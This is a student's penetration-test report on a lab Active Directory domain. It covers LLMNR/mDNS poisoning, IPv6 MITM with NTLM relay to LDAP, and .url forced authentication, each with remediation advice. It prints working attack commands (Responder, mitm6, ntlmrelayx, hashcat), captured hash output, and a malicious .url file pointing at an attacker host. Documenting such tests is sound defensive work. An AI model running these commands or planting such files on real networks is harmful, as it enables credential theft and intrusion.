---
title: 'Active Directory Security Audit: NTLM & Name Resolution Vulnerabilities'
date: '29-01-2026'
tags: ['Active Directory', 'NTLM Relay', 'Penetration Testing', 'Network Security']
layout: '../../layouts/MarkdownLayout.astro'
---

# Active Directory Security Audit: NTLM & Name Resolution Vulnerabilities @ HvA Amsterdam

**Date:** ocotber 15, 2025  
**Duration:** internal assessment  
**Scope:** Internal Windows Server 2019 Active Directory Environment (odinserver.local)

---

## Executive Summary

This report details a series of penetration tests focused on network-based vulnerabilities within NTLM authentication and Windows name resolution protocols. The audit successfully demonstrated how legacy protocols can be exploited to intercept NTLM hashes and perform relay attacks, posing a high risk for lateral movement and privilege escalation.

### Key Findings

- **Critical:** 1 vulnerabilities identified (NTLM Relay/MITM6)
- **High:** 2 vulnerabilities identified  (LLMNR/mDNS Poisoning, URL File Attack) 
- **Medium:** 0 vulnerabilities identified
- **Low:** 0 vulnerabilities identified

---

## Methodology

The audit followed a structured approach based on industry-standard penetration testing methodologies:

1. **Protocol Poisoning**
2. **Man-in-the-Middle (MITM)**
3. **Forced Authentication**
4. **Credential Cracking**

---

## Tools Used

```bash
$ sudo responder -I eth0 -w -d
$ sudo mitm6 -i eth0 -d odinserver.local
$ sudo python3 ntlmrelayx.py -6 -t ldap://169.254.113.72 -wh fakewpad.odinserver.local -l loot
$ hashcat.exe -m 5600 hashes.txt rockyou.txt
```

---

## Findings

### 1. LLMNR & mDNS Poisoning

**Severity:** High  
**Description:** The network allows legacy name resolution protocols (LLMNR/mDNS), enabling an attacker to spoof responses and capture NTLMv2 hashes from clients attempting to resolve non-existent hostnames.

**Evidence:**
```
[LLMNR] Poisoned answer sent to 10.0.2.x
[SMB] NTLMv2-SSP Hash captured for user: DESKTOP-Q3PQOT9\Bob de Bouwer
Hash: Bob de Bouwer::DESKTOP-Q3PQOT9:c06c54...
```

**Recommendation:** Disable LLMNR and NetBIIOS (NBT-NS) via Group Policy across all workstations and servers.

---

### 2. IPv6 MITM & NTLM Relay

**Severity:** critical  
**Description:** By acting as a rogue IPv6 DNS server, we redirected client traffic to a relay tool, allowing the relaying of authentication attempts to the Domain Controller via LDAP.

[*] Serving SMB/HTTP/LDAP Relay Servers
[*] Potential victim found via IPv6: fe80::3999:2
[*] Attempting to relay NTLM auth to ldap://169.254.113.72

**Recommendation:** Enforce SMB Signing and LDAP Signing/Channel Binding to prevent relay attacks.

---

### 3. URL File Forced Authentication

**Severity:** High  
**Description:** A malicious .url file placed in a public SMB share triggers an automatic authentication attempt when a user browses the folder.

[InternetShortcut]
URL=http://10.0.7.2
IconFile=\\10.0.7.2\icon.ico

**Recommendation:** Restrict write access to shared folders and disable the display of icons from network resources.

---

## Traffic Analysis

During the assessment, we monitored traffic directed through the attack machine:

- **Protocols Hijacked:** IPv6 (DHCPv6, DNS), LLMNR, HTTP, SMB
- **Successful Captures:** Multiple NTLMv2 hashes intercepted
- **Cracked Credentials:** User password recovered using dictionary attack (Password: [REDACTED])
---

## Remediation Plan

### Immediate Actions (Priority 1)
- [ ] Enforce SMB Signing via Group Policy
- [ ] Disable LLMNR and mDNS on all Windows clients
- [ ] Implement LDAP Signing and Channel Binding on Domain Controllers

### Short-term Actions (1-2 weeks)
- [ ] Monitor network for rogue DHCPv6 advertisements
- [ ] Audit permissions on all public SMB shares to prevent file placement

### Long-term Actions (1-3 months)
- [ ] Transition the environment toward Kerberos-only authentication
- [ ] Implement network segmentation to protect sensitive server VLANs

---

## Conclusion

The audit demonstrated that default Windows configurations allow for significant identity-based attacks, and that abusing legacy protocols enabled the recovery of valid credentials. Implementing the recommended mitigations will significantly harden the internal perimeter and reduce the risk of NTLM relay and related attacks.

**Risk Rating:** High

---

## References

- MITM6 + NTLM Relay Attack (ReSecurity)
- Responder & LLMNR Poisoning (Hackndo)
- URL File Attack Pentest Guide (ViperOne)
- Impacket Toolset (SecureAuth)

---

*Report prepared by: Rens Schuil*  
*Cybersecurity Student @ HvA Amsterdam*
